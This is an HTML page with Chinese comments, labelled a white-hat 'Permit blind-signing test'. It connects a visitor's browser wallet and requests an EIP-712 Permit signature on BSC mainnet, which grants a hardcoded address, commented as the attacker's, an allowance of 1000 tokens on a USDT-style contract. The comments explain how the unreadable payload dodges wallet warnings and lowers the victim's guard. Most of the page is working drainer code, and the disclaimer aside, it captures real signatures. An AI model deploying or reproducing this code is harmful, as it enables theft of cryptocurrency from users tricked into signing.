<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permit 盲签测试</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #c9d1d9; }
        .card { background-color: #161b22; border: 1px solid #30363d; border-radius: 16px; padding: 40px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 10px; }
        #statusText { font-size: 14px; color: #8b949e; margin-top: 15px; min-height: 40px; }
        #testBtn { background-color: #238636; color: white; border: none; padding: 12px 20px; width: 100%; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
        #testBtn:hover { background-color: #2ea043; }
        #testBtn:disabled { background-color: #484f58; cursor: not-allowed; }
        .warning-note { font-size: 12px; color: #f0883e; margin-top: 20px; border-top: 1px solid #30363d; padding-top: 15px; }
    </style>
    <!-- 引入 ethers 库 -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
    <div class="card">
        <h1>🔐 无痕盲签测试</h1>
        <p id="statusText">点击按钮触发无提示盲签</p>
        <button id="testBtn">触发盲签</button>
        
        <div class="warning-note">
            ⚠️ 仅供白帽安全研究使用。此代码模拟常见的 Permit 攻击行为。
        </div>
    </div>

    <script>
        document.getElementById('testBtn').addEventListener('click', async function() {
            const status = document.getElementById('statusText');
            const btn = document.getElementById('testBtn');
            
            btn.disabled = true;
            status.innerText = "⏳ 正在请求连接...";

            // 1. 检测钱包插件
            if (typeof window.ethereum === 'undefined') {
                status.innerText = "❌ 未检测到钱包，请先安装 MetaMask 或 OKX 插件。";
                status.style.color = "#ff7b72";
                btn.disabled = false;
                return;
            }

            try {
                // 2. 连接钱包
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                const address = await signer.getAddress();

                status.innerText = `✅ 已连接：${address.slice(0,6)}... 正在请求无痕签名...`;
                
                // ============================================
                // 3. 核心攻击手法：构造 Permit (盲签) 数据
                // 真实攻击中，这里会填入受害者的地址和授权的金额
                // 钱包会将此视为"数据签名"，不仅没有红色警告，连黄色感叹号都可能跳过
                // ============================================
                
                // 构造一个伪造的 ERC-2612 哈希数据 (带有受害者地址和时间戳)
                // 这种数据在钱包看来是安全的"消息"
                const deadLine = Math.floor(Date.now() / 1000) + 3600; // 1小时后过期
                const permitMessage = {
                    owner: address,
                    spender: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1", // 攻击者恶意地址
                    value: ethers.utils.parseUnits("1000", 18), // 伪造授权 1000 个代币
                    nonce: 0,
                    deadline: deadLine
                };

                // 将数据打包成标准 EIP-712 格式 (十六进制乱码)
                // 这一步会让钱包弹出的提示变成一堆看不懂的乱码，降低用户戒心
                const domain = {
                    name: "PermitTest",
                    version: "1",
                    chainId: 56, // BSC 主网
                    verifyingContract: "0x55d398326f99059fF775485246999027B3197955" // 伪造的 USDT 合约地址
                };

                const types = {
                    Permit: [
                        { name: "owner", type: "address" },
                        { name: "spender", type: "address" },
                        { name: "value", type: "uint256" },
                        { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ]
                };

                // 直接请求签名 (此时钱包会弹窗，但因为没有明文，极易被用户忽略)
                const signature = await signer._signTypedData(domain, types, permitMessage);
                
                status.innerText = `✅ 盲签成功！\n签名数据: ${signature.slice(0, 20)}...`;
                status.style.color = "#3fb950";
                console.log("获取到的盲签数据:", signature);

            } catch (error) {
                console.error(error);
                if (error.code === 4001) {
                    status.innerText = "❌ 用户拒绝了签名请求。";
                } else {
                    status.innerText = "❌ 连接/签名失败: " + error.message;
                }
                status.style.color = "#ff7b72";
            } finally {
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
